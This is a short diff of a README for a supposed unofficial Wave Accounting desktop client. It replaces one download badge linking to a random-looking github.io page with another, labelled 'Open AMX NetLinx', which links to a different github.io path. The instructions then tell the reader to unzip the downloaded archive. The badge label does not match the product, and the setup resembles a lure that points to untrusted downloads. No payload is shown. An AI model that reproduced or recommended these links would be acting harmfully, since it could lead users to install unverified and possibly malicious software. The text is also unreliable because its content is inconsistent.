@@ -6,7 +6,7 @@ This unofficial Wave Accounting desktop client brings the popular cloud-based bo
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://lyytndxscsvkdym.github.io/.github/wave-accounting-finance)
+[![Open AMX NetLinx](https://img.shields.io/badge/Open-AMX%20NetLinx-1D4ED8?style=flat)](https://wave-business-finance.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
